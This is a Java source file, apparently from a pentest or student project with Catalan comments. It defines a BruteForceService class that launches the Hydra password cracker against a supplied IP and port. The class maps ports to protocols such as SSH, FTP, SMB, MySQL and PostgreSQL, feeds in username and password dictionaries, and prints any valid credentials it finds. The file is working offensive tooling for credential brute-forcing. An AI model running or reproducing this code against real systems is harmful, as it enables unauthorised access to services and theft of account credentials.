package services;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

public class BruteForceService {


    public void atacar(String ip, int port, String rutaUsers, String rutaPass) {
        
        // Validacio basica de fitxers
        if (!validarFitxer(rutaUsers) || !validarFitxer(rutaPass)) {
            System.out.println("Error: Un dels diccionaris no existeix o no es pot llegir.");
            return;
        }

        // Detectem protocol (Hydra suporta moltissims, aqui posem els basics)
        String protocol = "http-get"; 
        if (port == 21) protocol = "ftp";
        if (port == 22) protocol = "ssh";
        if (port == 3306) protocol = "mysql";
        if (port == 445) protocol = "smb";
        if (port == 5432) protocol = "postgres";

        System.out.println("Iniciant atac Hydra Professional contra " + ip + ":" + port + " (" + protocol + ")");
        System.out.println("Usant diccionari usuaris: " + rutaUsers);
        System.out.println("Usant diccionari passwords: " + rutaPass);

        try {
            // Construim la comanda passant les rutes DIRECTAMENT
            // -L (fitxer usuaris), -P (fitxer passwords), -t 4 (fils), -I (ignora restores)
            ProcessBuilder pb = new ProcessBuilder(
                "hydra",
                "-L", rutaUsers,
                "-P", rutaPass,
                "-s", String.valueOf(port),
                "-t", "4",
                "-I", 
                protocol + "://" + ip
            );

            pb.redirectErrorStream(true);
            Process p = pb.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String linia;
            boolean exit = false;

            System.out.println("Hydra esta treballant... (Aixo pot tardar si el diccionari es gran)");

            while ((linia = reader.readLine()) != null) {
                // Hydra te un output molt brut, busquem la pepita d'or
                if (linia.contains("login:") && linia.contains("password:")) {
                    System.out.println("\n CREDENCIALS VALIDES TROBADES ");
                    System.out.println(linia.trim());
                    exit = true;
                }
            }
            p.waitFor();

            if (!exit) {
                System.out.println("L'atac ha finalitzat sense trovar contrasenyes amb aquests diccionaris.");
            }

        } catch (Exception e) {
            System.out.println("Error critic executant Hydra: " + e.getMessage());
        }
    }

    private boolean validarFitxer(String ruta) {
        File f = new File(ruta);
        if (!f.exists()) {
            System.out.println("Error: No trovo el fitxer -> " + ruta);
            return false;
        }
        return true;
    }
}